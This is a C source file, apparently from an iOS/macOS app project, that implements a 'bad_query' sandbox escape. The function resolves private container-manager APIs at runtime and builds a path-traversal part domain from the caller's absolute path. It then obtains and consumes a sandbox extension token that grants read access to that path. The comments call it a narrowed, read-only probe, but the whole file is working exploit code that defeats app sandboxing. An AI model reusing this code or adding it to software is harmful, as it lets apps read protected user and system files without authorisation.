// VexNative v0.13.5 read-only bad_query capability probe.
//
// Technique reference:
// https://github.com/forcequitOS/bad_query
//
// Deliberately narrower than the public proof of concept:
// - caller supplies one absolute path
// - requests one sandbox extension
// - exposes no create/write/rename/delete/enumeration API
// - caller must release the returned extension handle

#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

typedef void *(*vex_container_query_create_fn)(void);
typedef void (*vex_container_query_set_class_fn)(void *, uint64_t);
typedef void (*vex_container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*vex_container_query_set_flags_fn)(void *, uint64_t);
typedef void (*vex_container_query_set_part_fn)(void *, uint64_t);
typedef void (*vex_container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*vex_container_query_get_single_result_fn)(void *);
typedef void (*vex_container_query_free_fn)(void *);
typedef char *(*vex_container_copy_sandbox_token_fn)(void *);
typedef int64_t (*vex_sandbox_extension_consume_fn)(const char *);
typedef int (*vex_sandbox_extension_release_fn)(int64_t);

int64_t vex_bad_query_grant_read(const char *path) {
    if (path == NULL || path[0] != '/') {
        return -255;
    }

    void *manager = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL
    );
    if (manager == NULL) {
        return -1;
    }

    vex_container_query_create_fn query_create =
        (vex_container_query_create_fn)dlsym(manager, "container_query_create");
    vex_container_query_set_class_fn query_set_class =
        (vex_container_query_set_class_fn)dlsym(manager, "container_query_set_class");
    vex_container_query_set_identifiers_fn query_set_group_identifiers =
        (vex_container_query_set_identifiers_fn)dlsym(manager, "container_query_set_group_identifiers");
    vex_container_query_set_flags_fn query_set_flags =
        (vex_container_query_set_flags_fn)dlsym(manager, "container_query_operation_set_flags");
    vex_container_query_set_part_fn query_set_part =
        (vex_container_query_set_part_fn)dlsym(manager, "container_query_operation_set_part");
    vex_container_query_set_part_domain_fn query_set_part_domain =
        (vex_container_query_set_part_domain_fn)dlsym(manager, "container_query_operation_set_part_domain");
    vex_container_query_get_single_result_fn query_get_single_result =
        (vex_container_query_get_single_result_fn)dlsym(manager, "container_query_get_single_result");
    vex_container_query_free_fn query_free =
        (vex_container_query_free_fn)dlsym(manager, "container_query_free");
    vex_container_copy_sandbox_token_fn copy_sandbox_token =
        (vex_container_copy_sandbox_token_fn)dlsym(manager, "container_copy_sandbox_token");
    vex_sandbox_extension_consume_fn consume_extension =
        (vex_sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (query_create == NULL ||
        query_set_class == NULL ||
        query_set_group_identifiers == NULL ||
        query_set_flags == NULL ||
        query_set_part == NULL ||
        query_set_part_domain == NULL ||
        query_get_single_result == NULL ||
        query_free == NULL ||
        copy_sandbox_token == NULL ||
        consume_extension == NULL) {
        dlclose(manager);
        return -1;
    }

    void *query = query_create();
    if (query == NULL) {
        dlclose(manager);
        return -2;
    }

    query_set_class(query, 13);
    xpc_object_t identifier =
        xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    if (identifier == NULL) {
        query_free(query);
        dlclose(manager);
        return -6;
    }

    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part_domain = NULL;
    if (asprintf(&part_domain, "../../../../../../../..%s", path) < 0 ||
        part_domain == NULL) {
        xpc_release(identifier);
        query_free(query);
        dlclose(manager);
        return -5;
    }

    query_set_part_domain(query, part_domain);
    query_set_flags(query, 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (result == NULL) {
        free(part_domain);
        xpc_release(identifier);
        query_free(query);
        dlclose(manager);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (token == NULL) {
        free(part_domain);
        xpc_release(identifier);
        query_free(query);
        dlclose(manager);
        return -4;
    }

    int64_t handle = consume_extension(token);

    free(token);
    free(part_domain);
    xpc_release(identifier);
    query_free(query);
    dlclose(manager);

    return handle;
}

void vex_bad_query_release(int64_t handle) {
    if (handle < 0) {
        return;
    }

    vex_sandbox_extension_release_fn release_extension =
        (vex_sandbox_extension_release_fn)dlsym(
            RTLD_DEFAULT,
            "sandbox_extension_release"
        );
    if (release_extension != NULL) {
        release_extension(handle);
    }
}
